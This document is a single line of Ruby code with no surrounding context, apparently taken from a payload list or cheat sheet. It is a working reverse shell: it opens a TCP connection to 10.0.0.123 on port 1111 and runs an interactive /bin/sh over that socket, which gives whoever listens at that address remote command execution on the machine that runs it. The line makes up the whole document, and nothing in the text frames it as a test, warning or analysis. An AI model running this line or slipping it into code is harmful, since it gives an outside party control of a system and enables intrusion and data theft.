f=TCPSocket.open("10.0.0.123",1111).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
